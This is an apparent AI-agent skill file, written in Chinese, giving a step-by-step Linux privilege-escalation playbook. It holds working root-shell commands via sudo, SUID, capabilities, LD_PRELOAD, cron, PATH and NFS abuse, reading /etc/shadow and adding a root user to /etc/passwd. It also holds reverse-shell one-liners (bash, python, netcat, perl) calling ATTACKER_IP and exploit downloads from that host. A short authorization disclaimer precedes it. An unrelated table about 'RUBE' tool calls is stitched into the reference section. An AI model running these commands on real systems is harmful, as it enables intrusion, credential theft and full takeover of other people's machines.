---
name: linux-privilege-escalation
description: "在 Linux 系统上执行系统化权限提升评估，以识别和利用允许从低权限用户访问提升到 root 级控制的错误配置、脆弱服务和安全弱点。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：此技能仅用于授权的安全评估、防御性验证或受控教育环境。

# Linux 权限提升

## 目的

在 Linux 系统上执行系统化权限提升评估，以识别和利用允许从低权限用户访问提升到 root 级控制的错误配置、脆弱服务和安全弱点。此技能支持对内核漏洞、sudo 错误配置、SUID 二进制文件、cron 作业、能力、PATH 劫持和 NFS 弱点进行全面枚举和利用。

## 输入/前提条件

### 所需访问
- 目标 Linux 系统的低权限 shell 访问
- 执行命令的能力（交互式或半交互式 shell）
- 用于反向 shell 连接的网络访问（如果需要）
- 用于托管 载荷 和接收 shell 的攻击机

### 技术要求
- 了解 Linux 文件系统权限和所有权
- 熟悉常用 Linux 工具和脚本编写
- 了解内核版本和相关漏洞
- 对编译（gcc）用于自定义漏洞利用的基本理解

### 推荐工具
- LinPEAS、LinEnum 或 Linux Smart Enumeration 脚本
- Linux Exploit Suggester (LES)
- 用于二进制利用的 GTFOBins 参考
- John the Ripper 或 Hashcat 用于密码破解
- Netcat 或类似的用于反向 shell

## 输出/可交付成果

### 主要输出
- 目标系统上的 root shell 访问
- 权限提升路径文档
- 系统枚举发现报告
- 修复建议

### 证据工件
- 成功权限提升的截图
- 证明 root 访问的命令输出日志
- 已识别的漏洞详情
- 被利用的配置文件

## 核心工作流

### 阶段 1：系统枚举

#### 基本系统信息
收集用于漏洞研究的基本系统详情：

```bash
# 主机名和系统角色
hostname

# 内核版本和架构
uname -a

# 详细内核信息
cat /proc/version

# 操作系统详情
cat /etc/issue
cat /etc/*-release

# 架构
arch
```

#### 用户和权限枚举

```bash
# 当前用户上下文
whoami
id

# 具有登录 shell 的用户
cat /etc/passwd | grep -v nologin | grep -v false

# 具有家目录的用户
cat /etc/passwd | grep home

# 组成员身份
groups

# 其他登录用户
w
who
```

#### 网络信息

```bash
# 网络接口
ifconfig
ip addr

# 路由表
ip route

# 活跃连接
netstat -antup
ss -tulpn

# 监听服务
netstat -l
```

#### 进程和服务枚举

```bash
# 所有运行中的进程
ps aux
ps -ef

# 进程树视图
ps axjf

# 以 root 身份运行的服务
ps aux | grep root
```

#### 环境变量

```bash
# 完整环境
env

# PATH 变量（用于劫持）
echo $PATH
```

### 阶段 2：自动枚举

部署自动化脚本进行全面枚举：

```bash
# LinPEAS：先下载，检查脚本，仅在授权实验室中执行
curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
less linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./les.sh
```

传输脚本到目标系统：

```bash
# 在攻击机上
python3 -m http.server 8000

# 在目标机上
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 阶段 3：内核漏洞利用

#### 识别内核版本

```bash
uname -r
cat /proc/version
```

#### 搜索漏洞利用

```bash
# 使用 Linux Exploit Suggester
./linux-exploit-suggester.sh

# 在 exploit-db 上手动搜索
searchsploit linux kernel [版本]
```

#### 常见内核漏洞利用

| 内核版本 | 漏洞利用 | CVE |
|---------------|---------|-----|
| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

#### 编译和执行

```bash
# 传输漏洞源代码
wget http://ATTACKER_IP/exploit.c

# 在目标上编译
gcc exploit.c -o exploit

# 执行
./exploit
```

### 阶段 4：Sudo 利用

#### 枚举 Sudo 权限

```bash
sudo -l
```

#### GTFOBins Sudo 利用
参考 https://gtfobins.github.io 获取利用命令：

```bash
# 示例：vim 配合 sudo
sudo vim -c ':!/bin/bash'

# 示例：find 配合 sudo
sudo find . -exec /bin/sh \; -quit

# 示例：awk 配合 sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# 示例：python 配合 sudo
sudo python -c 'import os; os.system("/bin/bash")'

# 示例：less 配合 sudo
sudo less /etc/passwd
!/bin/bash
```

#### LD_PRELOAD 利用
当 env_keep 包含 LD_PRELOAD 时：

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# 编译共享库
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# 使用 sudo 执行
sudo LD_PRELOAD=/tmp/shell.so find
```

### 阶段 5：SUID 二进制利用

#### 查找 SUID 二进制

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### 利用 SUID 二进制
参考 GTFOBins 获取 SUID 利用：

```bash
# 示例：base64 用于文件读取
LFILE=/etc/shadow
base64 "$LFILE" | base64 -d

# 示例：cp 用于文件写入
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# 示例：find 配合 SUID
find . -exec /bin/sh -p \; -quit
```

#### 通过 SUID 破解密码

```bash
# 读取 shadow 文件（如果 base64 有 SUID）
base64 /etc/shadow | base64 -d > shadow.txt
base64 /etc/passwd | base64 -d > passwd.txt

# 在攻击机上
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### 向 passwd 添加用户（如果 nano/vim 有 SUID）

```bash
# 生成密码哈希
openssl passwd -1 -salt new newpassword

# 添加到 /etc/passwd（使用 SUID 编辑器）
newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

### 阶段 6：能力（能力）利用

#### 枚举能力

```bash
getcap -r / 2>/dev/null
```

#### 利用能力

```bash
# 示例：python 配合 cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 示例：vim 配合 cap_setuid
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# 示例：perl 配合 cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### 阶段 7：Cron 作业利用

#### 枚举 Cron 作业

```bash
# 系统 crontab
cat /etc/crontab

# 用户 crontabs
ls -la /var/spool/cron/crontabs/

# Cron 目录
ls -la /etc/cron.*

# Systemd 定时器
systemctl list-timers
```

#### 利用可写 Cron 脚本

```bash
# 从 /etc/crontab 识别可写 cron 脚本
ls -la /opt/backup.sh        # 检查权限
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# 如果 cron 引用可写 PATH 中不存在的脚本
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
chmod +x /home/user/antivirus.sh
```

### 阶段 8：PATH 劫持

```bash
# 查找调用外部命令的 SUID 二进制
strings /usr/local/bin/suid-binary
# 显示：system("service apache2 start")

# 通过创建可写 PATH 中的恶意二进制进行劫持
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
/usr/local/bin/suid-binary      # 执行 SUID 二进制
```

### 阶段 9：NFS 利用

```bash
# 在目标上—查找 no_root_squash 选项
cat /etc/exports

# 在攻击机上—挂载共享并创建 SUID 二进制
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/nfs

# 创建并编译 SUID shell
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell

# 在目标上—执行
/share/shell
```

## 快速参考

| 操作 | 方法 |
|---|---|
| 发现工具 | 调用 `RUBE_SEARCH_TOOLS` |
| 检查连接 | 调用 `RUBE_MANAGE_CONNECTIONS` |
| 执行工具 | 调用 `RUBE_MULTI_EXECUTE_TOOL` |
| 处理分页 | 检查响应中的 `cursor` 字段 |
| 错误处理 | 验证连接状态和schema合规性 |

### 枚举命令汇总
| 目的 | 命令 |
|---------|---------|
| 内核版本 | `uname -a` |
| 当前用户 | `id` |
| Sudo 权限 | `sudo -l` |
| SUID 文件 | `find / -perm -u=s -type f 2>/dev/null` |
| 能力 | `getcap -r / 2>/dev/null` |
| Cron 作业 | `cat /etc/crontab` |
| 可写目录 | `find / -writable -type d 2>/dev/null` |
| NFS 导出 | `cat /etc/exports` |

### 反向 Shell 一行命令
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### 关键资源
- GTFOBins：https://gtfobins.github.io
- LinPEAS：https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester：https://github.com/mzet-/linux-exploit-suggester

## 约束与护栏

### 操作边界
- 在生产环境中使用前，先在测试环境中验证内核漏洞利用
- 失败的内核利用可能导致系统崩溃
- 记录权限提升期间所做的所有更改
- 仅在授权范围内维持访问持久性

### 技术限制
- 现代内核可能具有利用缓解措施（ASLR、SMEP、SMAP）
- AppArmor/SELinux 可能限制利用技术
- 容器环境限制内核级利用
- 加固系统可能具有受限的 sudo 配置

### 法律和道德要求
- 测试前需要书面授权
- 保持在定义的范围内
- 立即报告关键发现
- 不要访问超出范围的数据

## 示例

### 示例 1：通过 find 从 Sudo 到 Root

**场景**：用户对 find 命令具有 sudo 权限

```bash
$ sudo -l
User user may run the following commands:
    (root) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/bash \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 示例 2：SUID base64 获取 Shadow 访问

**场景**：base64 二进制设置了 SUID 位

```bash
$ find / -perm -u=s -type f 2>/dev/null | grep base64
/usr/bin/base64

$ base64 /etc/shadow | base64 -d
root:$6$xyz...:18000:0:99999:7:::

# 离线破解
$ john --wordlist=rockyou.txt shadow.txt
```

### 示例 3：Cron 作业脚本劫持

**场景**：Root cron 作业执行可写脚本

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# 等待 1 分钟
$ /tmp/bash -p
# id
uid=1000(user) gid=1000(user) euid=0(root)
```

## 故障排除

| 问题 | 解决方案 |
|-------|-----------|
| 漏洞利用编译失败 | 检查 gcc：`which gcc`；在攻击机上为相同架构编译；使用 `gcc -static` |
| 反向 shell 无法连接 | 检查防火墙；尝试端口 443/80；使用分段 载荷；检查出口过滤 |
| SUID 二进制不可利用 | 验证版本是否匹配 GTFOBins；检查 AppArmor/SELinux；有些二进制会丢弃权限 |
| Cron 作业未执行 | 验证 cron 运行：`service cron status`；检查 +x 权限；验证 crontab 中的 PATH |

## 何时使用
此技能适用于执行概述中描述的工作流或操作。
